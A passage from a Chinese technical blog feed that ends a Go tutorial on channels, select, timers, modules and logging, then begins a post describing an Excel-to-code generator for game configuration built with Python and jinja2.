class="comment">// 模拟耗时</span></span><br><span class="line">msg := url + <span class="string">&quot; call&quot;</span></span><br><span class="line">ch &lt;- msg  <span class="comment">// 发送值msg到Channel ch中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;start all download, time=&quot;</span>, time.Now().Format(<span class="string">&quot;2006-01-02 15:04:05&quot;</span>))</span><br><span class="line">t1 := time.Now()</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> download(<span class="string">&quot;www.test_go.com/index&quot;</span> + <span class="keyword">string</span>(i + <span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">msg := &lt;-ch  <span class="comment">//// 从Channel ch中接收数据，并将数据赋值给msg</span></span><br><span class="line">fmt.Println(<span class="string">&quot;finish&quot;</span>, msg)</span><br><span class="line">&#125;</span><br><span class="line">t2 := time.Since(t1) / time.Second</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;download done, time_use=%ds\n&quot;</span>, t2)</span><br><span class="line"><span class="built_in">close</span>(ch)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Go 中 channel 的一个有趣特性是，在使用 channel 作为函数的参数时，可以指定 channel 是要发送数据还是接收数据。 随着程序的增长，可能会使用大量的函数，这时候，最好记录每个 channel 的意图，以便正确使用它们。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chan&lt;- int &#x2F;&#x2F; it&#39;s a channel to only send data</span><br><span class="line">&lt;-chan int &#x2F;&#x2F; it&#39;s a channel to only receive data</span><br></pre></td></tr></table></figure><p>两个函数的示例，一个函数用于读取数据，另一个函数用于发送数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">send</span><span class="params">(ch <span class="keyword">chan</span>&lt;-<span class="keyword">string</span>, message <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;sending: %#v\n&quot;</span>, message)</span><br><span class="line">ch &lt;- message</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(ch &lt;-<span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;recieving: %#v\n&quot;</span>, &lt;-ch)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="number">1</span>)</span><br><span class="line">send(ch, <span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">read(ch)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">func read(ch &lt;-chan string) &#123;</span><br><span class="line">    fmt.Printf(&quot;Receiving: %#v\n&quot;, &lt;-ch</span><br><span class="line">    ch &lt;- &quot;Bye!&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果试图使用一个 channel 在一个仅用于接收数据的 channel 中发送数据，将会出现编译错误。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># command-line-arguments</span><br><span class="line">.&#x2F;main.go:12:5: invalid operation: ch &lt;- &quot;Bye!&quot; (send to receive-only type &lt;-chan string)</span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># command-line-arguments</span><br><span class="line">.&#x2F;main.go:12:5: invalid operation: ch &lt;- &quot;Bye!&quot; (send to receive-only type &lt;-chan string)</span><br></pre></td></tr></table></figure><h2 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h2><p>有时候我们需要处理多个channel，此时可以使用select来做多路复用，需要等待事件发生。</p><p>select 语句的工作方式类似于 switch 语句，但它适用于 channel。 它会阻止程序的执行（阻塞），直到它收到要处理的事件。 如果它收到多个事件，则会随机选择一个。</p><p>select 语句的一个重要方面是，它在处理事件后完成执行。 如果要等待更多事件发生，则可能需要使用循环。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">process</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">time.Sleep(<span class="number">3</span> * time.Second)</span><br><span class="line">ch &lt;- <span class="string">&quot;Done processing!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">replicate</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">ch &lt;- <span class="string">&quot;Done replicating!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line">ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line"><span class="keyword">go</span> process(ch1)</span><br><span class="line"><span class="keyword">go</span> replicate(ch2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> process := &lt;-ch1:</span><br><span class="line">fmt.Println(process)</span><br><span class="line"><span class="keyword">case</span> replicate := &lt;-ch2:</span><br><span class="line">fmt.Println(replicate)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Done replicating!</span><br><span class="line">Done processing!</span><br></pre></td></tr></table></figure><h2 id="Timer和Ticker"><a href="#Timer和Ticker" class="headerlink" title="Timer和Ticker"></a>Timer和Ticker</h2><p>Ticker比较有用，可以周期性执行某些逻辑</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// gorountine 并发编程，Timer和Ticker</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">timer1 := time.NewTimer(time.Second * <span class="number">2</span>)  <span class="comment">// timer是一个定时器，代表未来的一个单一事件，你可以告诉timer你要等待多长时间</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;-timer1.C</span><br><span class="line">fmt.Println(<span class="string">&quot;Timer expire&quot;</span>)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">stop1 := timer1.Stop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> stop1 &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Timer stop&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ticker是一个定时触发的计时器，它会以一个间隔(interval)往Channel发送一个事件(当前时间)，</span></span><br><span class="line"><span class="comment">//而Channel的接收者可以以固定的时间间隔从Channel中读取事件。</span></span><br><span class="line"></span><br><span class="line">ticker := time.NewTicker(time.Second * <span class="number">2</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> t := <span class="keyword">range</span> ticker.C &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Tick,&quot;</span>, t.Format(<span class="string">&quot;2006-01-02 15:04:05&quot;</span>))</span><br><span class="line"><span class="comment">//似timer, ticker也可以通过Stop方法来停止。一旦它停止，接收者不再会从channel中接收数据了。</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Timer stop</span><br><span class="line">Tick, 2021-04-30 00:43:59</span><br><span class="line">Tick, 2021-04-30 00:44:01</span><br><span class="line">Tick, 2021-04-30 00:44:03</span><br><span class="line">Tick, 2021-04-30 00:44:05</span><br><span class="line">Tick, 2021-04-30 00:44:07</span><br><span class="line">Tick, 2021-04-30 00:44:09</span><br><span class="line">Tick, 2021-04-30 00:44:11</span><br><span class="line">Tick, 2021-04-30 00:44:13</span><br></pre></td></tr></table></figure><h2 id="Package和Modules"><a href="#Package和Modules" class="headerlink" title="Package和Modules"></a>Package和Modules</h2><h3 id="Package"><a href="#Package" class="headerlink" title="Package"></a>Package</h3><p>一般来说，一个文件夹可以作为 package，同一个 package 内部变量、类型、方法等定义可以相互看到。</p><p>如我们新建一个文件 calc.go， main.go 平级</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">fmt.Println(add(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// calc.go</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(n1 <span class="keyword">int</span>, n2 <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> n1 + n2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>go build -o test main.go calc.go  //文件名顺序并不敏感，或者go run .</p><h3 id="Modules"><a href="#Modules" class="headerlink" title="Modules"></a>Modules</h3><p>在项目文件夹下执行go mod init example</p><p>初始化一个 Module，名字为example</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;rsc.io/quote&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">mt.Println(quote.Hello())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译或者go run都会触发触发第三方包 rsc.io/quote的下载，具体的版本信息也记录在了go.mod中</p><p>考虑这样的项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;golearn&#x2F;</span><br><span class="line">├── go.mod</span><br><span class="line">├── main.go</span><br><span class="line">└── mypkg</span><br><span class="line">    └── mypkg.go</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">我的main.go需要调用mypkg&#x2F;mypkg.go的函数，可以这样操作，先在golearn路径下生成一个module：&#96;&#96;&#96;go mod init example&#96;&#96;&#96;，然后通过module&#x2F;目录名的方式调用，注意mypkg.go里定义的函数首字母需要大写，这样才表示该函数是public的，可以供外界调用。</span><br><span class="line"></span><br><span class="line">**Go 语言也有 Public 和 Private 的概念，粒度是包。如果类型&#x2F;接口&#x2F;方法&#x2F;函数&#x2F;字段的首字母大写，则是 Public 的，对其他 package 可见，如果首字母小写，则是 Private 的，对其他 package 不可见。**</span><br><span class="line"></span><br><span class="line">main.go</span><br><span class="line">&#96;&#96;&#96;go</span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">        &quot;fmt&quot;</span><br><span class="line">        &quot;example&#x2F;mypkg&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">        fmt.Println(&quot;test, &quot;, mypkg.Add(1,2))</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="日志模块"><a href="#日志模块" class="headerlink" title="日志模块"></a>日志模块</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        <span class="string">&quot;log&quot;</span></span><br><span class="line">        <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        file, err := os.OpenFile(<span class="string">&quot;info.log&quot;</span>, os.O_CREATE|os.O_APPEND|os.O_WRONLY, <span class="number">0644</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                log.Fatal(err)  <span class="comment">// fatal会直接退出本进程</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line">        log.SetOutput(file)</span><br><span class="line">        log.Print(<span class="string">&quot;hey, logging&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>日志记录格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021&#x2F;04&#x2F;30 14:59:45 hey, logging</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>excel转代码的编表脚本xls2code</title>
    <link href="/2021/04/15/excel%E8%BD%AC%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BC%96%E8%A1%A8%E8%84%9A%E6%9C%ACxls2code/"/>
    <url>/2021/04/15/excel%E8%BD%AC%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BC%96%E8%A1%A8%E8%84%9A%E6%9C%ACxls2code/</url>
    
    <content type="html"><![CDATA[<p>游戏行业中，策划的主力输出工具是excel，他们需要在一张张excel中不断填写和修改数据，因为游戏行业的多变性，因此策划需要经常反复地对一个系列数据进行修改，然后再到游戏里观察效果，再不断地作出调整。而这些excel表的修改反映到游戏里就是一个个功能点的调整，在游戏程序员看来，他们修改的是游戏程序里的参数和配置。因此，为了适应策划善变的想法，游戏开发中需要一个自动化编表工具，自动将一张张excel表转化为代码，做到自动化更新代码配置，而无需程序员主动参与。这就释放了游戏程序开发者的双手，让策划承担了一部分游戏开发者的工作，提升了整体游戏开发的效率。</p><p>要做这么一个编表工具，基本都是从以下几点出发来设计：</p><ol><li>与策划沟通excel的数据格式</li><li>设计自己的代码模板template</li><li>将excel表的数据读入内存</li><li>按照指定的格式解析数据</li><li>将解析后的数据按照代码模板生成出目标代码文件</li></ol><p>这里以excel文件转python代码的实践作为例子，解析编表过程。总体来讲，使用Python + jinja2库，就能实现一套通用的编表脚本。</p><h1 id="excel转python文件"><a href="#excel转python文件" class="headerlink" title="excel转python文件"></a>excel转python文件</h1><h2 id="1-填excel表，保存为后缀名为-xls文件"><a href="#1-填excel表，保存为后缀名为-xls文件" class="headerlink" title="1. 填excel表，保存为后缀名为.xls文件"></a>1. 填excel表，保存为后缀名为.xls文件</h2><p>首先需要跟策划商量需求，他们打算需要什么数据，而这些数据到最后又该以什么形式呈现在代码里。格式如下，一行为一条数据，首列是该行数据的唯一ID。</p><p><img src="/2021/04/15/excel%E8%BD%AC%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BC%96%E8%A1%A8%E8%84%9A%E6%9C%ACxls2code/1.png" alt="image"></p><h2 id="2-在-xls里建立CONFIG表，配置相关编表信息"><a href="#2-在-xls里建立CONFIG表，配置相关编表信息" class="headerlink" title="2. 在.xls里建立CONFIG表，配置相关编表信息"></a>2. 在.xls里建立CONFIG表，配置相关编表信息</h2><p>在excel文件里新建一个CONFIG表，作为这个excel文件的数据解析schema。我们在这个SHEET里，定义好输入的Excel文件路径、输出文件路径、代码模板路径以及excel中每一列的数据定义。</p><p><img src="/2021/04/15/excel%E8%BD%AC%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BC%96%E8%A1%A8%E8%84%9A%E6%9C%ACxls2code/2.png" alt="image"></p><h2 id="3-填写template代码模板"><a href="#3-填写template代码模板" class="headerlink" title="3. 填写template代码模板"></a>3. 填写template代码模板</h2><p>填写template代码模板，需要借助jinja2来完成代码的生成，该模板需要放在template文件夹内。一般而言，如果你的编程语言是Python，那我们就把excel数据转化为字典来存储，此时需要保证key要唯一，这里的key对用也就是excel表中的第一列，一般都定义为唯一ID。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">################## 以下是自动生成的代码 ##################</span><br><span class="line">## 比赛系统  lijunshi2015@163.com</span><br><span class="line"></span><br><span class="line">TimeConf &#x3D; &#123; &#123;% for v in content.list %&#125;</span><br><span class="line">&#123;&#123;v.id&#125;&#125; : &#123;</span><br><span class="line">&quot;season_name&quot;: &quot;&#123;&#123;v.season_name&#125;&#125;&quot;,</span><br><span class="line">&quot;release_start&quot;: &quot;&#123;&#123;v.release_start&#125;&#125;&quot;,</span><br><span class="line">&quot;release_end&quot;: &quot;&#123;&#123;v.release_end&#125;&#125;&quot;,</span><br><span class="line">&quot;exchange_end&quot;: &quot;&#123;&#123;v.exchange_end&#125;&#125;&quot;,</span><br><span class="line">&quot;turnplate_id&quot;: &#123;&#123;v.turnplate_id&#125;&#125;,</span><br><span class="line">&#125;,&#123;% endfor %&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def get_conf():</span><br><span class="line">return TimeConf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">################## 以上是自动生成的代码 ##################</span><br><span class="line"></span><br><span class="line">################## 以下是手工编写部分 ##################</span><br></pre></td></tr></table></figure><h2 id="4-运行自动编表脚本，参数传入的是要处理的xls文件"><a href="#4-运行自动编表脚本，参数传入的是要处理的xls文件" class="headerlink" title="4. 运行自动编表脚本，参数传入的是要处理的xls文件"></a>4. 运行自动编表脚本，参数传入的是要处理的xls文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 xls2code.py .&#x2F;xls&#x2F;game_season.xls</span><br></pre></td></tr></table></figure><h2 id="5-最后会自动生成配置代码，放在auto-codes文件夹内"><a href="#5-最后会自动生成配置代码，放在auto-codes文件夹内" class="headerlink" title="5. 最后会自动生成配置代码，放在auto_codes文件夹内"></a>5. 最后会自动生成配置代码，放在auto_codes文件夹内</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">################## 以下是自动生成的代码 ##################</span><br><span class="line">## 比赛系统  lijunshi2015@163.com</span><br><span class="line"></span><br><span class="line">TimeConf &#x3D; &#123; </span><br><span class="line">2101 : &#123;</span><br><span class="line">&quot;season_name&quot;: &quot;2021年第一赛季&quot;,</span><br><span class="line">&quot;release_start&quot;: &quot;2021-03-09 08:00:00&quot;,</span><br><span class="line">&quot;release_end&quot;: &quot;2021-05-09 24:00:00&quot;,</span><br><span class="line">&quot;exchange_end&quot;: &quot;2021-05-11 08:00:00&quot;,</span><br><span class="line">&quot;turnplate_id&quot;: 21013001,</span><br><span class="line">&#125;,</span><br><span class="line">2102 : &#123;</span><br><span class="line">&quot;season_name&quot;: &quot;2021年第二赛季&quot;,</span><br><span class="line">&quot;release_start&quot;: &quot;2021-05-11 08:00:00&quot;,</span><br><span class="line">&quot;release_end&quot;: &quot;2021-07-11 24:00:00&quot;,</span><br><span class="line">&quot;exchange_end&quot;: &quot;2021-07-13 08:00:00&quot;,</span><br><span class="line">&quot;turnplate_id&quot;: 21023001,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def get_conf():</span><br><span class="line">return TimeConf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">################## 以上是自动生成的代码 ##################</span><br><span class="line"></span><br><span class="line">################## 以下是手工编写部分 ##################</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-自己的业务代码调用配置代码，例子是demo-main-py"><a href="#6-自己的业务代码调用配置代码，例子是demo-main-py" class="headerlink" title="6. 自己的业务代码调用配置代码，例子是demo_main.py"></a>6. 自己的业务代码调用配置代码，例子是demo_main.py</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import auto_codes.game_time_conf as time_conf</span><br><span class="line"></span><br><span class="line">conf_time &#x3D; time_conf.get_conf()</span><br><span class="line">print(conf_time)</span><br></pre></td></tr></table></figure><h1 id="excel转cpp文件的步骤"><a href="#excel转cpp文件的步骤" class="headerlink" title="excel转cpp文件的步骤"></a>excel转cpp文件的步骤</h1><p>编表工具理论上可以通过xls生成任何语言的代码，关键在于配置编写指定语言的template，比如我们这次要通过excel表生成C++的头文件，方便被引用，可以参考xls/game_season_cpp.xls和模板template/game_timne_cpp.template.使用xls2code.py脚本编出代码文件game_time_conf.h，最后再被业务文件include调用。请参考demo_main.cpp。</p><p>使用的cpp模板如下，思路也是使用std::map将Excel数据转过来，再通过业务代码引用来使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include 